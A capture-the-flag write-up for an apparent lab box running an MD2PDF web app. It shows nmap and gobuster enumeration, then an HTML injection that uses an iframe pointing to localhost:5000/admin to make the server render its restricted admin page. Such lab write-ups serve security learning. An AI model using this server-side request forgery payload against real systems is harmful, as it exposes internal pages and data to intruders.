# Overview
<img width="704" height="181" alt="Screenshot_2025-10-02_19-47-13" src="https://github.com/user-attachments/assets/0e2f5ddc-daa5-421b-8916-92123f1ec38d" />

# Enumeration

First I execute a TCP scan to check how many ports does this server have.
```
nmap -T4 -O -A -sV -vv 10.201.52.33
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 5c:42:85:6f:94:b9:54:8b:8f:ca:8a:81:cc:ac:42:91 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCmH7/85X4yU7Yns1WMORyCZxvXr4Pcg8Of4fPkJtcLnH/VkVrB2NUe96HF2ErCJY3YR9ATBJHjOlEm4ekGdN5DTWe/pxzW6b0OieoqBmfxj/YCFg1WUOhAi8LnExGT45r8Grr4ni04JOMbt3U6oW2G32TwgHNWBSzdbudhQG1tbqrjcxwkr/9Nmcg/V10/d+yALhziWAGtH/2TAyLjTZ4iTkH2kTx2HlXjiGkacKUDEvWanB4IsaGX6k53Fu+hxVpoy727q1ejWG90U2SjPpUIzY2UaAeE+jYZNPhQmvKFmD8QN2Y/XdKHC0ybgSgvgOzBGbOY4t58BvrIB/y2XnHG18ivlu+1B0M3bY0Mneh8pnQUmqjTOFhXHtjdcbzNc6ZZcPSAwu/cGBILoKWxXRluRUYr4fCvK75XhLwFO8p1YaaucvFaOQBOB6sIjsiQq/bE7gCZkxgJz/9X1te+GuekhPokNk6b/WZyPYCMcF0M+YZrOjwhjuCoXg/tRi7Z53E=
|   256 a4:e2:73:82:ad:7a:18:c2:c5:28:99:f1:68:a4:f8:88 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCpDzGFhNJzJtdk2KT5UeESEogZsj+YBEWeyIHGbOx6xLfd9Da+jpyqxjNjEpklBQcMLnl6lZlpQ5bhAGxOzJTU=
|   256 c7:a3:78:39:84:66:a0:23:3e:27:8b:ea:09:cb:a7:5e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/g+N/7A85wnC/GaBNJtqeSuNPZV5ahcsHMwjr4rjir
80/tcp   open  rtsp    syn-ack ttl 60
|_http-title: MD2PDF
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2660
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="./static/codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="./static/bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|_    Content-Length: 0
5000/tcp open  rtsp    syn-ack ttl 60
|_rtsp-methods: ERROR: Script execution failed (use -d to debug)
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 2606
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8" />
|     <meta
|     name="viewport"
|     content="width=device-width, initial-scale=1, shrink-to-fit=no"
|     <link
|     rel="stylesheet"
|     href="codemirror.min.css"/>
|     <link
|     rel="stylesheet"
|     href="bootstrap.min.css"/>
|     <title>MD2PDF</title>
|     </head>
|     <body>
|     <!-- Navigation -->
|     <nav class="navbar navbar-expand-md navbar-dark bg-dark">
|     <div class="container">
|     class="navbar-brand" href="/"><span class="">MD2PDF</span></a>
|     </div>
|     </nav>
|     <!-- Page Content -->
|     <div class="container">
|     <div class="">
|     <div class="card mt-4">
|     <textarea class="form-control" name="md" id="md"></textarea>
|     </div>
|     <div class="mt-3 d-grid gap-2 d-md-
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     RTSP/1.0 200 OK
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|_    Content-Length: 0
...
```
I learn that this server has port 80 and 5000. 

# Port 80
<img width="1920" height="657" alt="Screenshot_2025-10-02_19-52-18" src="https://github.com/user-attachments/assets/4e2655b5-8ecd-4f57-bb14-3c05767a2112" />

Well, it is `gobuster` time
```
gobuster dir -u "http://10.201.52.33/" -w /usr/share/wordlists/dirb/common.txt -t 64
...
/admin                (Status: 403) [Size: 166]
```

Unfortunately I could not access the folder `admin` cos I got Forbidden error
I try to manually insert html tag into the server page on port 80, it works. I reckon that if I can abuse this vulnerability to view the content only the local host could
```
<iframe src="http://localhost/admin"></iframe>
```

This one does not work. Wait, what about port 5000, it is forbidden as well.
```
<iframe src="http://localhost:5000/admin"></iframe>
```

This one work and I get the flag successfully
Happy hacking!!!!
